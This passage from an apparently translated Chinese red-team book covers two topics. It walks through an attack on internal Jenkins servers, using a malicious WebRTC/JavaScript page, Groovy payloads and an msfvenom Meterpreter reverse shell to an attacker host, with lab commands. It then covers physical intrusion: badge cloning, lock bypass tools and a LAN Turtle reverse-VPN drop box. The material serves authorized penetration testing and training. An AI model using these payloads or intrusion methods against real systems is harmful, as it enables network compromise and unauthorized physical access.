  \ -p Outlook.Application -o test.hta\n```\n\n![](img/00157.jpeg)\n\n## 利用社会工程学攻击内部\
  \ Jenkins\n\n作为红队成员，攻击中的创造性正是我们工作极其令人兴奋的原因。我们喜欢将旧漏洞重燃，使其焕然一新。例如，如果您正在进行网络评估，您知道如果遇到问题未经身份验证的\
  \ Jenkins 应用程序（开发人员在持续集成中广泛使用），基本上就意味着完全被控制。这是因为它具有“功能”，允许 Groovy 脚本执行以进行测试。利用此脚本控制台，我们可以执行允许访问底层系统的\
  \ shell 命令。\n\n![](img/00157.jpeg)\n\n为什么这种方法成为控制如此流行的原因，因为几乎每个大公司都有某些实例的 Jenkins。外部攻击的问题在于，这些\
  \ Jenkins 服务都是托管在内部，无法从外部到达。\n\n我们如何在那些服务器上远程执行代码？在我们回答这个问题之前，我要求我的团队退一步，建立一个带有\
  \ Jenkins 的副本网络进行测试。一旦我们很好地理解了代码执行请求如何工作，我们现在可以构建适当的工具来获得 RCE。\n\n在这种情况下，我们通过 JavaScript\
  \ 和 WebRTC（Web 实时通信）的大量步骤解决了这个问题。首先，我们需要组织受害用户访问我们拥有的公共网站或我们存储的 XSS 负载的页面。一旦受害者访问我们的公共网站，我们将在其浏览器上执行\
  \ JavaScript 来运行我们的恶意负载。\n\n此负载会滥用 Chrome/Firefox“功能”，该功能允许 WebRTC 向受害者内部 IP。通过内部\
  \ IP，我们可以随后推断受害者计算机的本地子网，以了解其企业 IP 范围。现在，我们可以针对其网络范围内的每个 IP（代码仅扫描本地 `/24`，但在真实活动中，您希望它比那个更大），使用我们精心制作的\
  \ Jenkins 漏洞，通过默认 Jenkins 端口 8080。\n\n下一个问题是，我们使用什么负载？如果您玩过 Jenkins Console shell，您知道它有点挑剔，所以能够持续获得复杂的\
  \ PowerShell 负载可能很困难。为了解决这个问题，为 THP3 创建了一个工具 `generateJenkinsExploit.py` (`https://github.com/cheetz/generateJenkinsExploit`)，它将采用任何二进制文件，对其进行加密，并构建恶意攻击\
  \ JavaScript 页面。当受害者击中我们的恶意网页时，它将获取其内部 IP，并开始喷洒我们的漏洞到 `/24` 范围内的所有服务器。当它找到漏洞的 Jenkins\
  \ 服务器时，攻击将发送 Groovy 脚本负载，从攻击者的服务器抓取加密的二进制文件，解密并在 `C:\\Users\\Public\\RT.exe` 下执行\
  \ Meterpreter 二进制 (`RT.exe`)。\n\n概念（下图）中，这与服务器端请求伪造 (SSRF) 非常相似，我们迫使受害者浏览器重新向内部\
  \ IP 连接。\n\n*   受害者访问我们存储的 XSS 或恶意 JavaScript 页面。\n*   受害者浏览器执行 JavaScript/WebRTC\
  \ 获取内部 IP，并向本地内部网络喷洒 Groovy POST 负载。\n*   当找到 Jenkins 服务器时，我们的 Groovy 代码将告诉 Jenkins\
  \ 服务器从攻击者服务器抓取加密的负载，然后解密并执行二进制文件。\n*   在这种情况下，我们下载的加密可执行文件是 Meterpreter 负载。\n* \
  \  Meterpreter 在 Jenkins 服务器上执行，然后连接到我们的攻击者 Meterpreter 服务器。\n\n![](img/00158.jpeg)\n\
  \n注意：此漏洞在最新版本的 Jenkins 中不存在。2.x 之前的版本默认漏洞，因为它们没有启用 CSRF 保护（允许对 `/script/` 的盲调用）并且没有启用身份验证。\n\
  \n## 完整的 Jenkins 利用实验室\n\n*   我们将构建一个 Jenkins Window 服务器，以便可以重复此攻击。\n*   安装带有本地网络桥接接口的\
  \ Windows VM。\n*   在 Windows 系统上，下载并安装 JAVA JDK8。\n*   下载 Jenkins War 文件：\n    *\
  \   `http://mirrors.jenkins.io/war-stable/1.651.2/`\n*   启动 Jenkins：\n    *   `java\
  \ -jar jenkins.war`\n*   浏览 Jenkins：\n    *   `http://<Jenkins_IP>:8080/`\n*   测试\
  \ Groovy 脚本控制台：\n    *   `http://<Jenkins_IP>:8080/script`\n\n## 在 THP Kali VM 上利用\
  \ Jenkins\n\n*   下载 THP Jenkins Exploit Tool (`http://bit.ly/2IUG8cs`)。\n*   要执行实验室，我们首先需要创建\
  \ Meterpreter 负载：\n    *   `msfvenom -p windows/meterpreter/reverse_https LHOST=<attacker_IP>\
  \ LPORT=8080 -f exe > badware.exe`\n*   加密我们的 Meterpreter 二进制：\n    *   `cd /opt/generateJenkinsExploit`\n\
  \    *   `python3 ./generateJenkinsExploit.py -e badware.exe`\n*   创建称为 `badware.html`\
  \ 的恶意 JavaScript 页面：\n    *   `python3 ./generateJenkinsExploit.py -p http://<attacker_IP>/badware.exe.encrypted\
  \ > badware.html`\n*   将加密二进制文件和恶意 JavaScript 页面移动到 Web 目录：\n    *   `mv badware.html\
  \ /var/www/html/`\n    *   `mv badware.exe.encrypted /var/www/html/`\n\n![](img/00159.jpeg)\n\
  \n\n\n\n现在，在一个完全不同的系统中，使用 Chrome 或 Firefox 访问您的攻击者网页 `http://<attacker_IP>/badware.html`。只需访问该恶意页面，您的浏览器就会使用\
  \ JavaScript 和 POST 请求，通过端口 8080 对我们的 Groovy 有效负载向内部 `/24` 网络广播。当它找到 Jenkins 服务器时，会导致该服务器下载我们的加密\
  \ Meterpreter，解密并执行它。在企业的网络上，您可能会得到各种各样的外壳。\n\n![](img/00160.jpeg)\n\nJenkins 只是您可以进行的众多攻击之一。任何允许使用\
  \ GET 或 POST HTTP 方法未经身份验证执行代码的功能都可以在同一场景中使用。这就是您需要识别受害者内部利用的应用程序并制作恶意攻击。\n\n##\
  \ 结论\n\n社会工程学是那些猫鼠游戏将永远是区域。我们严重依赖人类因素，并利用恐惧、紧急性和信任的目标弱点。利用这些漏洞，我们可以创建非常聪明的活动，在系统破坏中具有高成功率。\n\
  \n在指标和目标的方面，我们需要远离等待用户报告钓鱼/SE 邮件的反应性模型，转向积极的模型，我们可以积极狩猎这些类型的恶意攻击。\n\n"
- "# 6 侧踢 - 物理攻击\n\n![](img/00161.jpeg)\n\n作为安全评估的一部分，CSK 要求您的团队对设施进行物理评估。这包括检查他们的入口和保护是否足够，如果能够在进入现场，则验证警卫的反应和响应时间。\n\
  \n*快速提示：在进行任何物理评估之前，请务必检查当地、州和联邦法律。例如，在密西西比、俄亥俄、内华达或弗吉尼亚，仅仅拥有开锁工具可能被视为非法。我不是律师，所以明智的是您先咨询律师。此外，确保您获得了适当的批准，与设施的物理安全团队一起，并签署文件，以防被抓获。在实际上采取行动的之前，与物理安全团队合作，讨论如果安保人员抓住您，您是否可以逃跑，或者是否必须停止，以及是否有人在监视无线电。另外，确保警卫不联系当地执法人员。最后的事情是您实际上去坐牢。*\n\
  \n现在，是时候闯入网络小猫的保密设施了。根据网站，看起来它位于 `299792458 Light Dr`。在我们对 Google 街道进行一些侦察之后，我们注意到该设施是门控的，并且有一个或两个警卫舱。我们可以识别多个入口点和区域，我们可以翻过栅栏。通过初步的步行，我们也识别了一些摄像头、大门、入口点和读卡系统。\n\
  \n## 读卡器克隆机\n\n读卡器克隆机在 THP2 中被广泛覆盖，因此我将主要进入更新。ProxCard II 徽章没有公共/私人握手，仍易受克隆和 bruteforce\
  \ ID 号攻击。\n\n在 THP2 中，我们喜欢克隆 ProxCard II 徽章，因为它们没有任何保护措施，可以轻松克隆，并且卡片通常批量逐步购买，这允许轻松\
  \ bruteforce。这全部使用 `Proxmark3` 设备。此后，已发布更便携的此设备版本称为 `Proxmark3 RDV2 Kit` (`http://hackerwarehouse.com/product/proxmark3-rdv2-kit/`)。此版本可以用电池配置，并且比原始\
  \ `Proxmark3` 更小。\n\n![](img/00162.jpeg)\n\n我们遇到的其他常见卡片：\n\n*   HID iClass (`13.56\
  \ MHz`)\n*   HID ProxCard (`125 kHz`)\n*   EM4100x (`125 kHz`)\n*   MIFARE Classic\
  \ (`13.56 MHz`)\n\n这是 Kevin Chung 的绝佳资源：`https://blog.kchung.co/rfid-hacking-with-the-proxmark-3/`。\n\
  \n## 物理工具绕过访问点\n\n我们不会进入物理工具和操作方法，因为那是一整本书，需要大量的经验。如往常一样，进行物理评估的最佳方法是练习，建立物理实验室，并弄清楚什么有效，什么无效。就我们在过去使用过的一些酷工具而言：\n\
  \n*   开锁工具 (`https://www.southord.com/`) - SouthOrd 一直是我们首选的开锁工具。质量高，工作良好。\n*  \
  \ 大门绕过设备 (`https://www.lockpickshop.com/GATE-BYPASS.html`) - 绕过锁定大门的工具。\n*   Shove-it\
  \ 工具 (`https://www.lockpickshop.com/SJ-50.html`) - 如果门和闩之间有适当的空间，则简单工具。类似于信用卡滑过打开门，您使用\
  \ shove-it 工具进入后拉回。\n*   Under the Door 2.0 (`https://shop.riftrecon.com/products/under-the-door-tool`)\
  \ – 适用于带有杠杆手柄的门。我们可以使用 Under the Door 工具字面意思是在门下方，缠绕在杠杆手柄周围，并拉下。以前，这些通常在酒店中发现，但我们在企业中也肯定发现。\n\
  *   Air Canisters - 一种便宜且易于使用的工具，绕过内部带有运动传感器的解锁门。查看此视频，查看 Samy Kamkar 绕过这些类型的门：`https://www.youtube.com/watch?v=xcA7iXSNmZE`\n\
  \n请记住，这些工具和物理评估的目的是跟踪和监控公司对物理安全项目的反应。所以，我们的工作是确保我们不仅充分记录系统中的缺点，还确保响应时间和事件处理是可以接受的。\n\
  \n### LAN Turtle (`lanturtle.com`)\n\nLAN Turtle 是 Hak5 我最喜欢的工具之一。在之前的书中，我们曾研究过用于投放盒的小尺寸\
  \ Raspberry Pi 和 ODROID。在这些设备上运行 Kali Linux，并通过 SSH 或 VPN 将其返回到我们的攻击机，是进行物理渗透测试的绝佳方式。\n\
  \n这些投放盒随着年份不断演变。现在，LAN Turtle 是可以隐藏在任意机器后面，由 USB 供电，对用户透明。LAN Turtle 使用 USB 作为 NIC\
  \ 卡，并通过以太网电缆代理所有流量。\n\n还有一个 3G 蜂窝版，但我们在这里不会演示它。\n\n#### 设置 LAN Turtle\n\nLAN Turtle\
  \ 的目的是代替投放盒。虽然它具有像自动 SSH、DNS 欺骗、meterpreter、ptunnel、script2email、urlsnarf、responder\
  \ 和其他许多功能，但主要的红队用途是获得进入网络的权限。\n\n历史上，甚至在先前的 THP 书中，我们使用 SSH 反向 Shell。这些通常工作足够，但对于更深入的扫描/复杂攻击，我们需要完全进入网络。为此，我们必须配置\
  \ Reverse VPN 连接。反向 VPN 连接看起来是什么样的？\n\n嗯，由于 LAN Turtle 将放在组织内部台式机后面的背面，我们无法直接连接它。因此，我们将让\
  \ LAN Turtle 首先通过端口 443 向外，VPN 返回我们的 OpenVPN AS 服务器。从我们的攻击者 Kali 盒子，我们也必须登录 VPN\
  \ 服务器。一旦 LAN Turtle 和我们的攻击机进入我们的服务器，我们可以将我们的流量通过 LAN Turtle 进行扫描或攻击盒子。\n\n![](img/00163.jpeg)\n\
  \n![](img/00164.jpeg)\n\n虽然 OpenVPN 反向隧道并非新事物，但 Hak5 的团队确实做了一件很好的工作，制作教程。我不得不修改一些后续命令，但观看他们的\
  \ YouTube 视频进行更详细的说明：`https://www.youtube.com/watch?v=b7qr0laM8kA`。\n\n这是三个主要部分：\n\
